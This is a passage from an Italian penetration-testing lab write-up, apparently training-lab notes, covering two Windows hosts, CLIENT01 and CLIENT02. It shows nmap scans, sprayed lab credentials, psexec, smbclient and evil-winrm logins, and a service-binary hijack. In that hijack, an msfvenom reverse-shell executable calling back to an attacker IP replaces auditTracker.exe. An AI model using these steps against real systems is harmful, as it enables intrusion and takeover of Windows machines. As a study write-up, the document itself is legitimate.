49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-18T11:50:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
|_nbstat: NetBIOS name: CLIENT01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:1d:4d (VMware)
```

Attraverso uno _spraying attack_ ricavo le seguenti credenziali per accedere a questa macchina come amministratore:

```bash
yoshi:Mushroom!
```

Con le credenziali trovate precedentemente lancio il seguente comando:

```bash
/usr/share/doc/python3-impacket/examples/psexec.py -port 445 medtech.com/yoshi:Mushroom\!@172.16.184.82
```



# 172.16.184.83 - CLIENT02 {pwned:local&proof}

```bash
nmap -sC -sV -O -p- 172.16.184.83
```

```bash
Nmap scan report for 172.16.184.83 (172.16.184.83)
Host is up (0.032s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): IBM z/OS 1.11.X (85%)
OS CPE: cpe:/o:ibm:zos:1.11
Aggressive OS guesses: IBM z/OS 1.11 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-18T11:50:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 2s
|_nbstat: NetBIOS name: CLIENT02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:0a:1a (VMware)
```

Con le credenziali trovate precedentemente lancio il seguente comando:

```bash
smbclient -N -L //172.16.184.83/ -U medtech.com/joe%Flowers1 
```

```bash
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C               Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Windows         Disk       
```

Faccio lo stesso per l'utente wario:

```bash
smbclient \\\\172.16.184.83\\C -U medtech.com/wario%Mushroom\!
```

E trovo sul suo desktop la flag local.txt:

```bash
smb: \USers\wario\desktop\> dir
  .                                  DR        0  Sat May 18 09:21:55 2024
  ..                                  D        0  Wed Oct  5 08:12:49 2022
  local.txt                           A       34  Sat May 18 09:21:55 2024
```

Accedo alla macchina:

```bash
evil-winrm -i 172.16.220.83 -u 'wario' -p "Mushroom\!"
```

Una volta dentro lancio winpeas e scopro un file eseguibile interessante nella cartella DevelopmentExecutables:

```bash
File Permissions "C:\DevelopmentExecutables\auditTracker.exe": Everyone [AllAccess],Authenticated Users [WriteData/CreateFiles]
```

Quindi provo ad eseguire un attacco di tipo Service Binary Hijacking.

Creo un eseguibile per ottenere una reverse shell:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.212 LPORT=6666 -f exe -o auditTracker.exe 
```

Rinomino il file originale auditTracker.exe in ciao.exe e trasferisco l'eseguibile appena creato sulla macchina target.

Quindi, avvio un listener sulla porta 6666 della macchina kali e lancio il comando per stoppare il servizio e quello per riavviarlo sulla macchina target:

```bash
sc.exe stop audittracker

sc.exe start audittracker
```

Ottengo cosi una reverse-shell con privilegi da amministratore e il flag proof.txt.

